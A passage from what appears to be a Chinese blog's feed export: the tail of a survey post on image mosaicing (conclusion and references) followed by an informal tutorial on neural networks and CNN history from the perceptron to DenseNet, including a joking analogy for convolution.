<h2 id="五、结论"><a href="#五、结论" class="headerlink" title="五、结论"></a>五、结论</h2><p>Image mosaicing is an important task in the field of computer vision. Success of a mosaicing algorithm depends primarily on registration and blending methods. This paper provides a classification of image mosaicing methods based on image registration and blending algorithms. In addition to providing the description of the different categories, this paper discusses the advantages and disadvantages of each category. From the discussion, it is obvious that there is no single best image mosaicing category. At the same time, the continuous advent of new mosaicing methods in recent years makes it really difficult to choose an appropriate mosaicing algorithm for a specific purpose. Hence, this paper aims at providing a guide for selecting a suitable mosaicing method for a specific application. Although an extensive research has been done in the area of mosaicing, there are still problems to be addressed. For example, mosaicing in the presence of images with significant parallax is still a challenge. Another problem is the processing time. All mosaicing techniques are time consuming and cannot run on low power and low frequency devices. Addressing these issues would be where the future research might be directed at.</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><A NAME="18">[18]: Sa. Ghannam, A.L. Abbott <strong>Cross correlation versus mutual information for image mosaicing</strong> Int. J. Adv. Comput. Sci. Appl. (IJACSA), 4 (2013)</a></p>
<p><A NAME="19">[19]: A. Levin, A. Zomet, S. Peleg, Y. Weiss <strong>Seamless image stitching in the gradient domain</strong> Comput. Vis.-ECCV (2004), pp. 377–389</a></p>
<p><A NAME="20">[20]: R. Szeliski <strong>Image alignment and stitching: a tutorial</strong> Found. Trends Comput. Graph. Vis., 2 (2006), pp. 1–104</a></p>
<p><A NAME="21">[21]: A. Behrens, M. Guski, T. Stehle, S. Gross, T. Aach, Intensity based multi-scale blending for panoramic images in fluorescence endoscopy, in: IEEE International Symposium on Biomedical Imaging: From Nano to Macro, 2010, pp. 1305–1308.</a></p>
<p><A NAME="22">[22]: G. Guandong, J. Kebin, A new image mosaics algorithm based on feature points matching, in: International Conference on Innovative Computing, Information and Control, 2007, pp. 471–471.</a></p>
<p><A NAME="23">[23]: K.-I. Okumura, S. Raut, Q. Gu, T. Aoyama, T. Takaki, I. Ishii, Real-time feature-based video mosaicing at 500 fps, in: International Conference on Intelligent Robots and Systems (IROS), 2013, pp. 2665–2670.</a></p>
<p><A NAME="24">[24]: S. Park, D. Ghosh, N. Kaabouch, R.A. Fevig, W. Semke, Hierarchical multi-level image mosaicing for autonomous navigation of UAV, in: IS&amp;T/SPIE Electronic Imaging, 2012, pp. 830116–830116-9.</a></p>
<p><A NAME="25">[25]L. Miao, Y. Yue, Automatic document image mosaicing algorithm with hand-held camera, in: International Conference on Intelligent Control and Information Processing (ICICIP), 2011, pp. 1094–1097.</a></p>
<p><A NAME="26">[26]<br>H. Shejiao, H. Yaling, C. Zonghai, J. Ping, Feature-based image automatic mosaicing algorithm, in: in: World Congress on Intelligent Control and Automation, 2006, pp. 10361–10364.</a></p>
<p><A NAME="27">[27]<br>A. Nasibov, H. Nasibov, F. Hacizade, Seamless image stitching algorithm using radiometric lens calibration for high resolution optical microscopy, in: International Conference on Soft Computing, Computing with Words and Perceptions in System Analysis, Decision and Control, 2009, pp. 1–4.</a></p>
<p><A NAME="28">[28]<br>T. Vercauteren, A. Perchant, X. Pennec, N. Ayache, Mosaicing of confocal microscopic in vivo soft tissue video sequences, in: Medical Image Computing and Computer-Assisted Intervention–MICCAI, 2005, pp. 753–760.</a></p>
<p><A NAME="29">[29]<br>R. Miranda-Luna, C. Daul, W.C. Blondel, Y. Hernandez-Mier, D. Wolf, F. Guillemin<br><strong>Mosaicing of bladder endoscopic image sequences: distortion calibration and registration algorithm</strong><br>IEEE Trans. Biomed. Eng., 55 (2008), pp. 541–553</a></p>
<p><A NAME="30">[30]<br>G. Gao, K. Jia, A new image mosaics algorithm based on feature points matching, in: International Conference on Innovative Computing, Information and Control, 2007, pp. 471–471.</a></p>
<p><A NAME="31">[31]<br>T. Botterill, S. Mills, R. Green, Real-time aerial image mosaicing, in: International Conference of Image and Vision Computing New Zealand (IVCNZ), 2010, pp. 1–8.</a></p>
<p><A NAME="32">[32]<br>L. Yao, Image mosaic based on SIFT and deformation propagation, in: IEEE International Symposium on Knowledge Acquisition and Modeling Workshop, 2008, pp. 848–851.</a></p>
<p><A NAME="33">[33]<br>G. Jun-Hui, Z. Jun-Hua, A. Zhen-Zhou, Z. Wei-Wei, L. Hui-Min, An approach for X-ray image mosaicing based on Speeded-up robust features, in: International Conference on Wavelet Active Media Technology and Information Processing (ICWAMTIP), 2012, pp. 432–435.</a></p>
<p><A NAME="34">[34]<br>F. Yang, L. Wei, Z. Zhang, H. Tang<br><strong>Image mosaic based on phase correlation and Harris operator</strong><br>J. Comput. Inform. Syst., 8 (2012), pp. 2647–2655</a></p>
<p><A NAME="35">[35]<br>M. Vivet, S. Peleg, X. Binefa, Real-time stereo mosaicing using feature tracking, in: IEEE International Symposium on Multimedia (ISM), 2011, pp. 577–582.</a></p>
<p><A NAME="36">[36]<br>M. El-Saban, M. Izz, A. Kaheel, M. Refaat, Improved optimal seam selection blending for fast video stitching of videos captured from freely moving devices, in: IEEE International Conference on Image Processing (ICIP), 2011, pp. 1481–1484.</a></p>
<p><A NAME="37">[37]<br>S.Z. Kovalsky, G. Cohen, J.M. Francos, Registration of joint geometric and radiometric image deformations in the presence of noise, in: IEEE/SP Workshop on Statistical Signal Processing, 2007, pp. 561–565.</a></p>
<p><A NAME="38">[38]<br>D. Vaghela, K. Naina<br><strong>A review of image mosaicing techniques</strong><br>Int. J. Adv. Res. Comput. Sci. Manage. Stud., 2 (3) (2014)</a></p>
<p><A NAME="39">[39]<br>P. Jain, V.K. Shandliya<br><strong>A review paper on various approaches for image mosaicing</strong><br>Int. J. Comput. Eng. Res., 3 (4) (2013)</a></p>
<p><A NAME="40">[40]<br>R. Abraham, P. Simon, Review on mosaicing techniques in image processing, in: International Conference on Advanced Computing and Communication Technologies (ACCT), 2013, pp. 63–68.</a></p>
<p><A NAME="41">[41]<br>H. Joshi, M.K. Sinha, A survey on image mosaicing techniques, in: International Journal of Advanced Research in Computer Engineering &amp; Technology (IJARCET), vol. 2(2), 2013.</a></p>
<p><A NAME="42">[42]<br>M.H.M. Patel, A.P.P.J. Patel, A.P.M.S.G. Patel<br><strong>Comprehensive study and review of image mosaicing methods</strong><br>Int. J. Eng. Res. Technol. (2012)</a></p>
<p><A NAME="43">[43]<br>J.M. Fitzpatrick, D.L. Hill, C.R. Maurer Jr.<br>Image registration<br>Handbook Med. Imag., 2 (2000), pp. 447–513</a></p>
<p><A NAME="44">[44]<br>K. Berberidis, I. Karybali, A new efficient cross-correlation based image registration technique with improved performance, in: Proceedings of the European Signal Processing Conference, 2002, pp. 3–6.</a></p>
<p><A NAME="45">[45]<br>F. Zhao, Q. Huang, W. Gao, Image matching by normalized cross-correlation, in: IEEE International Conference on Acoustics, Speech and Signal Processing, 2006, pp. II–II.</a></p>
<p><A NAME="46">[46]<br>T. Vercauteren, A. Meining, F. Lacombe, A. Perchant, Real time autonomous video image registration for endomicroscopy: fighting the compromises, in: Biomedical Optics (BiOS), 2008, pp. 68610C–68610C-8.</a></p>
<p><A NAME="47">[47]<br>A. Dame, E. Marchand, Video mosaicing using a mutual information-based motion estimation process, in: IEEE International Conference on Image Processing (ICIP), 2011, pp. 1493–1496.</a></p>
<p><A NAME="48">[48]<br>C. de Cesare, M.-J. Rendas, A.-G. Allais, M. Perrier, Low overlap image registration based on both entropy and mutual information measures, in: OCEANS, 2008, pp. 1–9.</a></p>
<p><A NAME="49">[49]<br>M.B. Islam, M.M.J. Kabir<br><strong>A new feature-based image registration algorithm</strong><br>Comput. Technol. Appl., 4 (2013), pp. 79–84</a></p>
<p><A NAME="50">[50]<br>V.S. Bind<br><strong>Robust Techniques for Feature-Based Image Mosaicing</strong><br>National Institute of Technology Rourkela (2013)</a></p>
<p><A NAME="51">[51]<br>E. Zagrouba, W. Barhoumi, S. Amri<br><strong>An efficient image-mosaicing method based on multifeature matching</strong><br>Mach. Vis. Appl., 20 (2009), pp. 139–162</a></p>
<p><A NAME="52">[52]<br>J. Jiao, B. Zhao, S. Wu, A speed-up and robust image registration algorithm based on fast, in: IEEE International Conference on Computer Science and Automation Engineering (CSAE), 2011, pp. 160–164.</a></p>
<p><A NAME="53">[53]<br>X. Wang, J. Sun, H.-Y. Peng, Efficient panorama mosaicing based on enhanced-FAST and graph cuts, in: Recent Advances in Computer Science and Information Engineering, vol. 128, 2012, pp. 757–762.</a></p>
<p><A NAME="54">[54]<br>D.G. Lowe<br>Distinctive image features from scale-invariant keypoints<br>Int. J. Comput. Vis., 60 (2004), pp. 91–110</a></p>
<p><A NAME="55">[55]<br>D. Liqian, J. Yuehui, Moon landform images fusion and Mosaic based on SIFT method, in: International Conference on Computer and Information Application (ICCIA), 2010, pp. 29–32.</a></p>
<p><A NAME="56">[56]<br>Y. Li, Y. Wang, W. Huang, Z. Zhang, Automatic image stitching using sift, in: International Conference on Audio, Language and Image Processing, 2008, pp. 568–571.</a></p>
<p><A NAME="57">[57]<br>Y. Lei, W. Xiaoyu, Z. Jun, L. Hui, A research of feature-based image mosaic algorithm, in: International Congress on Image and Signal Processing (CISP), 2011, pp. 846–849.</a></p>
<p><A NAME="58">[58]<br>H. Bay, T. Tuytelaars, L. Van Gool, Surf: speeded up robust features, in: Computer vision–ECCV, 2006, pp. 404–417.</a><br><A NAME="59">[59]<br>N. Geng, D. He, Y. Song<br><strong>Camera image mosaicing based on an optimized SURF algorithm</strong><br>Indones. J. Electr. Eng., 10 (2012), pp. 2183–2193</a></p>
<p><A NAME="60">[60]<br>R. Wen, C. Hui, L. Jiaju, X. Yanyan, R. Haeusler, Mosaicing of microscope images based on SURF, in: International Conference on Image and Vision Computing New Zealand, 2009, pp. 271–275.</a></p>
<p><A NAME="61">[61]<br>H. Joshi, K. Sinha, Novel techniques image mosaicing based on image fusion using harris aand SURF, in: International Conference on Computer Science and Information Technology, 2013.</a></p>
<p><A NAME="62">[62]<br>V.S. Bind, P.R. Muduli, U.C. Pati<br><strong>A robust technique for feature-based image mosaicing using image fusion</strong><br>Int. J. Adv. Comput. Res., 3 (2013), p. 263</a></p>
<p><A NAME="63">[63]<br>K. Peng, M. Hongbing, An automatic airborne image mosaicing method based on the SIFT feature matching, in: International Conference on Multimedia Technology (ICMT), 2011, pp. 155–159.</a></p>
<p><A NAME="64">[64]<br>J. Zhu, M. Ren<br><strong>Image mosaic method based on SIFT features of line segment</strong><br>Comput. Math. Methods Med., 2014 (2014)</a></p>
<p><A NAME="65">[65]<br>J. Xiao, Y. Zhang, M. Shah, Adaptive region-based video registration, in: IEEE Workshops on Application of Computer Vision, 2005, pp. 215-220.</a></p>
<p><A NAME="66">[66]<br>J. Prescott, M. Clary, G. Wiet, T. Pan, K. Huang, Automatic registration of large set of microscopic images using high-level features, in: IEEE International Symposium on Biomedical Imaging: Nano to Macro, 2006, pp. 1284–1287.</a></p>
<p><A NAME="67">[67]<br>M. Deshmukh, U. Bhosle<br><strong>A survey of image registration</strong><br>Int. J. Image Process. (IJIP), 5 (2011), p. 245</a></p>
<p><A NAME="68">[68]<br>H. Xie, N. Hicks, G.R. Keller, H. Huang, V. Kreinovich<br><strong>An IDL/ENVI implementation of the FFT-based algorithm for automatic image registration</strong><br>Comput. Geosci., 29 (8) (2003), pp. 1045–1055</a></p>
<p><A NAME="69">[69]<br>C. Wang, Y. Cheng, C. Zhao, Robust subpixel registration for image mosaicing, in: Chinese Conference on Pattern Recognition, 2009, pp. 1–5.</a></p>
<p><A NAME="70">[70]<br>R. Prados Gutiérrez<br><strong>Image Blending Techniques and their Application in Underwater Mosaicing</strong><br>Springer (2014)</a></p>
<p><A NAME="71">[71]<br>D.K. Jain, G. Saxena, V.K. Singh, Image mosaicing using corner techniques, in: International Conference on Communication Systems and Network Technologies (CSNT), 2012, pp. 79–84.</a></p>
<p><A NAME="72">[72]<br>Y. Xiong, K. Turkowski, Registration, calibration and blending in creating high quality panoramas, in: IEEE Workshop on Applications of Computer Vision Proceedings, 1998, pp. 69–74.</a></p>
<p><A NAME="73">[73]<br>P. Liang, X. Zhiwei, D. Jiguang, Joint edge detector based on Laplacian pyramid, in: International Congress on Image and Signal Processing (CISP), 2010, pp. 978–982.</a></p>
<p><A NAME="74">[74]<br>A. Pandey, U.C. Pati, A novel technique for non-overlapping image mosaicing based on pyramid method, in: IEEE India Conference (INDICON), 2013, pp. 1–6.</a></p>
<p><A NAME="75">[75]<br>Y. Xiong, Eliminating ghosting artifacts for panoramic images, in: IEEE International Symposium on Multimedia, 2009, pp. 432–437.</a></p>
<p><A NAME="76">[76]<br>R. Szeliski, M. Uyttendaele, D. Steedly, Fast Poisson blending using multi-splines, in: IEEE International Conference on Computational Photography (ICCP), 2011, pp. 1–8.</a></p>
<p><A NAME="77">[77]<br>N. Gracias, M. Mahoor, S. Negahdaripour, A. Gleason<br>Fast image blending using watersheds and graph cuts<br>Image Vis. Comput. (2009), pp. 597–607</a></p>
<p><A NAME="78">[78]<br>H. Wen, J. Zhou, An improved algorithm for image mosaic, in: International Symposium on Information Science and Engineering, 2008, pp. 497–500.</a></p>
<p><A NAME="79"> [79] <a href="http://blog.csdn.net/dandan_397/article/details/42110719">详解Harris角点检测及代码实现</a></a></p>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>图像拼接</tag>
        <tag>综述</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是卷积神经网络</title>
    <url>/post/convolutional-neural-network-introduction/</url>
    <content><![CDATA[<p>学到卷积神经网络，搜索到的资料一般都是这样的</p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_a1.png-QNthin" alt="神经网络"></p>
<span id="more"></span>

<p>或是这样的</p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_a2.jpg-QNthin" alt="神经网络"></p>
<p>这尼玛什么鬼，故弄玄虚忽悠投资人的吧。。再搜一下什么BP神经网络，深度神经网络，所有的教材都像下图一样，一大堆圈圈，无数跟线连起来，显得那么装逼，可菜鸟们就是看不懂到底是啥。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Convolution_a3.png-QNthin" alt="神经网络"></p>
<!-- 有关其它神经网络的介绍请异步另一篇文章： -->


<h2 id="0x00-瞎扯淡-什么是卷积"><a href="#0x00-瞎扯淡-什么是卷积" class="headerlink" title="0x00 瞎扯淡 - 什么是卷积"></a>0x00 瞎扯淡 - 什么是卷积</h2><p>我第一次接触到卷积是本科2年级，为了做图像识别，准备把这些基础知识恶补一下。可是翻开教材，满书的“傅里叶变换”“线性时不变系统”…… 果断的就放弃了。。</p>
<ul>
<li>难懂之因：<em>为了数学美，拆卸了脚手架。教科书书常用“定义—定理”的体系，先给出数学定义，然后给出若干性质，从公式到公式，逐步推导。有的教科书采用用信号“反褶、平移、相乘、积分”给出几何解释，属于用数学解释数学，提问者不满足这种解释。这不是当年发明卷积的大师们的“需求–猜想—发现—证明—应用”的路径，大师们建设好“卷积”大厦后，为了数学美，拆卸了脚手架，现在人们看到的是炼成的钢铁，看不出钢铁是怎样炼成的。造成了部分非数学专业学生的一个难点。——<a href="http://blog.sciencenet.cn/home.php?mod=space&uid=287179&do=blog&id=425373">唐常杰</a></em></li>
</ul>
<p>其实卷及根本就没那么麻烦，编书的老师简直就在卖弄自己的数学功底。看看下面的解释，卷积这个高达上的名词瞬间就变得通俗易懂了。</p>
<h4 id="1-给卷积一个通俗的解释——关于卷积的一个血腥的讲解"><a href="#1-给卷积一个通俗的解释——关于卷积的一个血腥的讲解" class="headerlink" title="1. 给卷积一个通俗的解释——关于卷积的一个血腥的讲解"></a>1. 给卷积一个通俗的解释——关于卷积的一个血腥的讲解</h4><p><code>因为关于卷积的内容太血腥，于是我把它移到了附录里面。按几下空格或者PageDown即可观看</code></p>
<h2 id="0x01-什么是神经网络"><a href="#0x01-什么是神经网络" class="headerlink" title="0x01 什么是神经网络"></a>0x01 什么是神经网络</h2><p>神经网络形象的可以表示成本文开始的那张图，一堆圈圈分成一层一层的被一些线连接起来。那么每一部分是什么意思呢，让我们从神经元开始讲起。</p>
<h3 id="1-神经元（感知机）"><a href="#1-神经元（感知机）" class="headerlink" title="1. 神经元（感知机）"></a>1. 神经元（感知机）</h3><p>学过高中生物的都知道，神经元分为<code>树突（dendrite）</code>、<code>轴突（axon）</code>和<code>胞体</code>。其中，树突具有接受刺激并将冲动传入细胞体的功能，细胞体对输入的刺激进行计算，最后由轴突的分枝把神经冲动传给其他神经元或效应器。上个世纪六十年代（1958年）<code>感知机</code>模型被提出，如下图所示。感知机的左边是的树突，可以接受传入信号（x1,x2,x3）；右边是轴突，负责输出信号。那么如何处理输入信号呢，为了简化模型，我们先认为<code>如果输入的都是1,那么输出1,否则输出0</code>。</p>
<p><img src="http://qiniu.s1nh.org/CNN_perceptron_1.png-QNthin"></p>
<p>简化的感知机模型未免也太弱智了，必须所有的传入神经同时刺激胞体才能使此神经元有响应（激活）。于是科学家们把弱智的神经元胞体改造了一下，成为下面这样子（图片来自网络，所以下图的y对应于上图的output）</p>
<p><img src="http://qiniu.s1nh.org/CNN_perceptron_2.png-QNthin"></p>
<p>这就有点高级了，首先，每个传入信号$x_i$都被标注了权重$w_i$，还增加了偏置<code>b</code>（bias)。其中c是组合函数（通常情况是求和），a为激活函数（这个有点复杂，有兴趣的自行google）。<strong>别被上面的图搞糊涂，其实神经元（感知机）就是一个数学公式：$y=(x_1 * w_1+x_2 * w_2+…+x_n * w_n+b)*a$ 即首先对所有的输入数据乘以对应的权重并求和，最后与激活函数相乘。</strong></p>
<p>也许你会发现_卧槽这么简单，小学乘法呀，那有什么卵用_。感知机能（且一定能）将线性可分的数据集分开，想不明白的可以看<a href="https://zhuanlan.zhihu.com/p/27224109">这篇文章</a>的第一节<code>感知机能做什么？</code>。除了区分线性可分数据集以外，缺失没什么卵用了，连异或（XOR）问题都解决不了。</p>
<h3 id="2-我们把神经元连接起来（多层感知机）"><a href="#2-我们把神经元连接起来（多层感知机）" class="headerlink" title="2. 我们把神经元连接起来（多层感知机）"></a>2. 我们把神经元连接起来（多层感知机）</h3><p>自从发现感知机对除了线性可分的数据外没什么卵用以后，感知机的研究进入了寒冬，直到有个大神把几个感知机链接起来成下面的样子：</p>
<p><img src="http://qiniu.s1nh.org/CNN_perceptron_3.jpg-QNthin"></p>
<p>对于异或（XOR）问题，只要像上图一样，把三个神经元连接成两层，第一层神经元分别激活<code>x+y&gt;0</code> <code>x+y&lt;2</code>，第二层的神经元像刚开始的弱智神经元一样，如果第一层神经元的输出都为1，那么输出为1即可。</p>
<p><strong>这么简单的思路，为什么还会进入那么久的寒冬？</strong>其实不是上个世纪的人智商太低，而是因为这种多层网络无法训练。也就是说，以当时的技术无法确定神经元中w的值，所以对于输入信号多层感知机就不知道怎么激活了。直到BP算法的出现（BP算法请自行google）。<em>其实1968年BP算法就被作者认识到了，并在1974年写在了毕业论文中，只是因为寒蝉效应没人理他。直到1986年这种方法才流行开来。</em></p>
<p>可以证明，<a href="http://neuralnetworksanddeeplearning.com/chap4.html">多层神经元可以表达所有连续函数</a>。因此，理论上讲，只要网络足够大，层数足够多，神经网络是可以拟合各种问题的！（当然网络太大就过拟合了- -）</p>
<h2 id="0x02-卷积神经网络历史"><a href="#0x02-卷积神经网络历史" class="headerlink" title="0x02 卷积神经网络历史"></a>0x02 卷积神经网络历史</h2><p>假设我们要对100×100像素的图片进行分类，如果用上面的多层感知机来做（现在叫全连接层），那么输入数据就是10000个，如果再来几十层网络，每层几千个节点，那么估计也只有朝鲜的计算机才能算出来了吧&gt;_&lt;</p>
<h3 id="1-图像的卷积"><a href="#1-图像的卷积" class="headerlink" title="1. 图像的卷积"></a>1. 图像的卷积</h3><p>之前接触过图像算法的同鞋们对卷积一定很熟悉，什么<code>Laplacian</code>，<code>soble</code>算子之类的讲的就是卷积核。图像卷积的计算方法其实就是<strong>滑动窗口和加权平均</strong>（如下图所示）。对于原始图片，用一个固定的卷积核在图片上滑动，每滑动一个像素就计算对应位置的加权和并记录下来。</p>
<p><img src="http://qiniu.s1nh.org/CNN_conv_0.gif"></p>
<p><img src="http://qiniu.s1nh.org/CNN_conv_1.png-QNthin"></p>
<p>图像经过不同的卷积核后产生的新图像是不同的，比如下图的原始图片分别用了低通和高通卷积核后的结果。</p>
<p><img src="http://qiniu.s1nh.org/CNN_conv_2.jpg-QNthin"></p>
<p>再比如下图（原始图片分别用之前说的Laplacian，soble卷积核卷一下）：</p>
<p><img src="http://qiniu.s1nh.org/CNN_conv_3.jpg-QNthin"></p>
<p>经过观察以后，不难明白卷积对于图像的意义是<strong>提取图像不同频段的特征</strong></p>
<h3 id="2-LeNet"><a href="#2-LeNet" class="headerlink" title="2. LeNet"></a>2. LeNet</h3><p>上一章讲了1986年BP算法开始流行，证明了多层网络可以训练以后，Yann LeCun大牛像我一样意识到不能用全连接层进行图片分类后就开始了卷及神经网络的研究，并解决了应用在书信邮编中的手写数字的分类问题。其实只用模板匹配（只有10个神经元的单层感知机）的方法也能进行识别，但是效果只能达到92%（多层感知机为98%）。模板匹配的方法跟卷积一模一样，只是卷积核的大小等于输入图片的大小，我训练的模板如下图，代码见之前的博文：</p>
<p><img src="http://qiniu.s1nh.org/Blog_Tensorflow_MNIST_3.png"></p>
<p>LeNet的基本原理就是对输入图像一层一层的卷积，最后接一个softmax把结果分为10类。<a href="http://yann.lecun.com/exdb/publis/pdf/lecun-01a.pdf">论文</a>实在是太长了，有兴趣的同鞋可以看看。</p>
<h3 id="3-AlexNet"><a href="#3-AlexNet" class="headerlink" title="3. AlexNet"></a>3. AlexNet</h3><p>上个世纪的计算机硬件实在太差了，卷积网络又是个耗资源的方法，所以没被广泛应用。（同等资源下<code>传统特征+SVM</code>也可以取得相当的效果，看过上个世纪<code>Andrew Ng</code>机器学习课的应该都知道，神经网络的讲解几乎是一带而过，重点都是SVM、AdaBoost、随机森林、GBDT、LR、FTRL这些概念）</p>
<p>到了2012年，Alex借助GPGPU技术，使用了两个NVIDIA GPU进行并行训练（话说作者确实牛逼，用GPU就算了，还来了个多GPU并行），使得top5错误率一下子降低到了17.0%</p>
<p>除了<code>多GPU</code>+更深的<code>网络层数</code>，AlexNet还体现了<code>LRN</code> <code>Dropout</code> <code>ReLU</code>等现在流行的方法（再次膜拜）。</p>
<h3 id="4-VGG"><a href="#4-VGG" class="headerlink" title="4. VGG"></a>4. VGG</h3><p><strong>没有什么问题是多层卷积网络解决不了的，如果有，那就再加10层</strong>。于是<code>Karen Simonyan</code>就把AlexNet的网络由8层加深到19层，取名叫VGG，夺得了当年比赛的第二名。（其实也有新技术啦，比如把卷积核变小- -）</p>
<h3 id="5-GoogLeNet"><a href="#5-GoogLeNet" class="headerlink" title="5. GoogLeNet"></a>5. GoogLeNet</h3><p><code>当年VGG运气不好，碰到了GoogLeNet，否则就是比赛第一名了。</code></p>
<p>为什么GoogLeNet排名第一呢，是的，因为比VGG还要深十几层。但是，巨量参数容易产生过拟合也会增加计算量，说白了就是网络<code>无法训练</code>。因此GoogLeNet提出了一个叫做Inception的子结构，如下图：</p>
<p><img src="http://qiniu.s1nh.org/CNN_inception_1.jpg-QNthin"></p>
<p>Inception将一个图像分别用不同大小的卷积核卷一下，然后连接起来，据说让参数量降低了好几倍。其中Inception其实有好多好多版本，有兴趣的同鞋可以自定Google。完整的GoogLeNet如下图。</p>
<p><img src="http://qiniu.s1nh.org/CNN_inception_2.jpg-QNthin"></p>
<h3 id="6-ResNet"><a href="#6-ResNet" class="headerlink" title="6. ResNet"></a>6. ResNet</h3><p>GoogLeNet在某种程度上可以看作把网络加宽了，而ResNet不一样，依然坚信着<strong>没有最深只有更深</strong>。何凯明一口气把网络加深到了一百多层，然后在当年的ImageNet比赛中拿了第一。</p>
<p>然而其实并没有这么简单（据说朝鲜早就在研究1000层的神经网络了，也没见他们得奖）。大神设计了一个叫做残差的模块（如下图），一层网络不仅仅连接着下一层，还通过飞线跨过几层走到了后边。</p>
<p><img src="http://qiniu.s1nh.org/CNN_resnet_1.png-QNthin"></p>
<h3 id="7-DenseNet"><a href="#7-DenseNet" class="headerlink" title="7. DenseNet"></a>7. DenseNet</h3><p>ResNet 虽然效果了不得，但速度确实有点慢。ResNet的思想是把一层的输出跨几层传递到后面，DenseNet的思路更简单粗暴，把所有的层都连接起来了（在连接处的区别为ResNet是求和，DenseNet是concat）,实验效果超好。</p>
<p><img src="http://qiniu.s1nh.org/CNN_densenet_1.png-QNthin"></p>
<h3 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. 总结</h3><p><img src="http://qiniu.s1nh.org/CNN_conclu_2.png-QNthin"></p>
<p>做目标检测（YOLO）的官网有个<a href="https://pjreddie.com/darknet/imagenet/#alexnet">统计</a>，我贴出来供参考：</p>
<p><img src="http://qiniu.s1nh.org/CNN_conclu_1.png-QNthin"></p>
<ul>
<li><p><code>AlexNet</code>: The model that started a revolution! The original model was crazy with the split GPU thing so this is the model from some follow-up work.</p>
</li>
<li><p><code>Darknet Reference Model</code>: This model is designed to be small but powerful. It attains the same top-1 and top-5 performance as AlexNet but with 1/10th the parameters. It uses mostly convolutional layers without the large fully connected layers at the end. It is about twice as fast as AlexNet on CPU making it more suitable for some vision applications.</p>
</li>
<li><p><code>VGG-16</code>: The Visual Geometry Group at Oxford developed the VGG-16 model for the ILSVRC-2014 competition. It is highly accurate and widely used for classification and detection. I adapted this version from the Caffe pre-trained model. It was trained for an additional 6 epochs to adjust to Darknet-specific image preprocessing (instead of mean subtraction Darknet adjusts images to fall between -1 and 1).</p>
</li>
<li><p><code>Extraction</code>: I developed this model as an offshoot of the GoogleNet model. It doesn’t use the “inception” modules, only 1x1 and 3x3 convolutional layers.</p>
</li>
<li><p><code>Darknet19</code>: I modified the Extraction network to be faster and more accurate. This network was sort of a merging of ideas from the Darknet Reference network and Extraction as well as numerous publications like Network In Network, Inception, and Batch Normalization.</p>
</li>
<li><p><code>Darknet19 448x448</code>: I trained Darknet19 for 10 more epochs with a larger input image size, 448x448. This model performs significantly better but is slower since the whole image is larger.</p>
</li>
<li><p><code>Resnet 50</code>: For some reason people love these networks even though they are so sloooooow. Whatever.</p>
</li>
<li><p><code>Resnet 152</code>: For some reason people love these networks even though they are so sloooooow. Whatever.</p>
</li>
<li><p><code>Densenet 201</code>: I love DenseNets! They are just so deep and so crazy and work so well. Like Resnet, still slow since they are sooooo many layers but at least they work really well!</p>
</li>
</ul>
<h2 id="0xFF-附录-瞎扯淡-什么是卷积"><a href="#0xFF-附录-瞎扯淡-什么是卷积" class="headerlink" title="0xFF 附录 瞎扯淡 - 什么是卷积"></a>0xFF 附录 瞎扯淡 - 什么是卷积</h2><p><code>接着第0章的卷积继续说</code></p>
<h4 id="1-给卷积一个通俗的解释——关于卷积的一个血腥的讲解-1"><a href="#1-给卷积一个通俗的解释——关于卷积的一个血腥的讲解-1" class="headerlink" title="1. 给卷积一个通俗的解释——关于卷积的一个血腥的讲解"></a>1. 给卷积一个通俗的解释——关于卷积的一个血腥的讲解</h4><p>比如说你的老板命令你干活，你却到楼下打台球去了，后来被老板发现，他非常气愤，扇了你一巴掌（注意，这就是输入信号，脉冲），于是你的脸上会渐渐地（贱贱地）鼓起来一个包，你的脸就是一个系统，而鼓起来的包就是你的脸对巴掌的响应，好，这样就和信号系统建立起来意义对应的联系。下面还需要一些假设来保证论证的严谨：假定你的脸是线性时不变系统，也就是说，无论什么时候老板打你一巴掌，打在你脸的同一位置（这似乎要求你的脸足够光滑，如果你说你长了很多青春痘，甚至整个脸皮处处连续处处不可导，那难度太大了，我就无话可说了哈哈），你的脸上总是会在相同的时间间隔内鼓起来一个相同高度的包来，并且假定以鼓起来的包的大小作为系统输出。好了，那么，下面可以进入核心内容——卷积了！</p>
<p>如果你每天都到地下去打台球，那么老板每天都要扇你一巴掌，不过当老板打你一巴掌后，你5分钟就消肿了，所以时间长了，你甚至就适应这种生活了……如果有一天，老板忍无可忍，以0.5秒的间隔开始不间断的扇你的过程，这样问题就来了，第一次扇你鼓起来的包还没消肿，第二个巴掌就来了，你脸上的包就可能鼓起来两倍高，老板不断扇你，脉冲不断作用在你脸上，效果不断叠加了，这样这些效果就可以求和了，结果就是你脸上的包的高度随时间变化的一个函数了（注意理解）；如果老板再狠一点，频率越来越高，以至于你都辨别不清时间间隔了，那么，求和就变成积分了。可以这样理解，在这个过程中的某一固定的时刻，你的脸上的包的鼓起程度和什么有关呢？和之前每次打你都有关！但是各次的贡献是不一样的，越早打的巴掌，贡献越小，所以这就是说，某一时刻的输出是之前很多次输入乘以各自的衰减系数之后的叠加而形成某一点的输出，然后再把不同时刻的输出点放在一起，形成一个函数，这就是卷积，卷积之后的函数就是你脸上的包的大小随时间变化的函数。本来你的包几分钟就可以消肿，可是如果连续打，几个小时也消不了肿了，这难道不是一种平滑过程么？反映到剑桥大学的公式上，f(a)就是第a个巴掌，g(x-a)就是第a个巴掌在x时刻的作用程度，乘起来再叠加就ok了，大家说是不是这个道理呢？我想这个例子已经非常形象了，你对卷积有了更加具体深刻的了解了吗？</p>
<p>看到这里，我们简直不能更明白，什么是卷积了</p>
<ul>
<li>时不变系统：就是系统的参数不随时间而变化，即不管输入信号作用的时间先后，输出信号响应的形状均相同。就是说不管老板什么时候打你，肿胀发展的程度是一样的</li>
<li>线性时不变系统：在时不变系统中满足叠加原理。即老板在t时刻打你N巴掌，那么肿胀的程度成N倍增加。</li>
</ul>
<h4 id="2-物理意义"><a href="#2-物理意义" class="headerlink" title="2. 物理意义"></a>2. 物理意义</h4><p>我们先画几个简单的函数图像，理解“卷积”的<strong>物理意义</strong>，暂时不管它为什么要对称，为什么要反转。</p>
